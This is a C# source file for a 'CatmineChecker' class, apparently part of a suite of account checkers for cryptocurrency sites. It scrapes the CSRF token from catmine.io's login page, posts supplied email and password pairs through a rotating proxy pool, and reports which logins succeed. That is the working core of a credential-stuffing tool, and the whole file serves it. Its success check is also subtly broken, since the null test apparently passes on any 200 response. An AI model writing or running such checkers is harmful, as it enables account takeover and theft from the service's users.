using System.Net;
using System.Net.Http.Headers;
using Core.Models;
using HtmlAgilityPack;

namespace Core.Checkers.Crypto;

public class CatmineChecker
{
    private readonly ProxyPool _proxy;

    public CatmineChecker(ProxyPool proxy)
    {
        _proxy = proxy;
    }

    public async Task<bool> TryLoginAsync(string login, string password)
    {
        using var http = await _proxy.TakeClient();
        var html = new HtmlDocument();
        var token = await GetLoginToken(http);
        var response = await http.PostAsync("https://catmine.io/login",
            new StringContent($"_token={token}&email={login}&password={password}", new MediaTypeHeaderValue("application/x-www-form-urlencoded")));

        if (response.StatusCode != (HttpStatusCode) 200) return false;

        html.LoadHtml(await response.Content.ReadAsStringAsync());
        
        return html.DocumentNode.QuerySelectorAll(".dropdown-link .user-logout") is not null;
    }
    
    private async Task<string> GetLoginToken(HttpClient client)
    {
        var html = new HtmlDocument();
        var response = await client.GetStringAsync("https://catmine.io/login");
        
        html.LoadHtml(response);
        
        return html.QuerySelector("meta[name='csrf-token']")!.Attributes["content"].Value;
    }
}